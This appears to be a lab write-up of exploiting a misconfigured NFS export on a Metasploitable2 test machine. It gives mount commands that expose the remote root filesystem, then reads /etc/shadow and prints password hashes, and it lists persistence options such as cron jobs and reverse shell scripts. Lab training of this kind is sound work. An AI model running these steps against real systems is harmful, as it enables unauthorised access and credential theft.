# NFS Exploit - Misconfigured Export with Root Access

# Summary

We exploited a misconfigured NFS (Network File System) export on Metasploitable2 which allowed us to mount the entire root (`/`) directory of the target system. This gave us access to sensitive files such as `/etc/shadow`, enabling offline password cracking or further privilege escalation.

---

#  Vulnerability

- **Service:** NFS
- **Port:** 2049
- **Exploit Type:** Misconfiguration (`no_root_squash`)
- **CVE:** N/A (Misconfiguration, not a specific CVE)

---

# Tools Used

- `showmount`
- `mount`
- `cat`
- `sudo`
- Kali Linux

---

# Steps to Reproduce

### 1. Check for NFS Exports

showmount -e 192.168.6.3

Export list for 192.168.6.3:
/ *
This means the root directory / is exported to all IPs — highly insecure.

## 2. Mount the NFS Share Locally

sudo mkdir /mnt/nfs_root
sudo mount -t nfs 192.168.6.3:/ /mnt/nfs_root

## 3. Check Mounted Filesystem

ls /mnt/nfs_root

You should now see the full file tree of the target system.

## 4. Read sensitive files

sudo cat /mnt/nfs_root/etc/shadow

Partial Output: root:
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
...
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
...
(see screenshot for whole output)

# Impact

Full read/write access to target filesystem

Access to password hashes in /etc/shadow

Can place cron jobs, SSH keys, or reverse shell scripts

Possible privilege escalation to persistent root shell

# MITRE ATT&CK Mapping

Initial Access: 

T1135 – Network Share Discovery

Lateral Movement / Persistence:

[T1021.002 – Remote Services: SMB/Windows Admin Shares](used here in Unix form via NFS)

T1003.008 – OS Credential Dumping: /etc/shadow

[T1053.003 – Scheduled Task/Job: Cron](if used for persistence)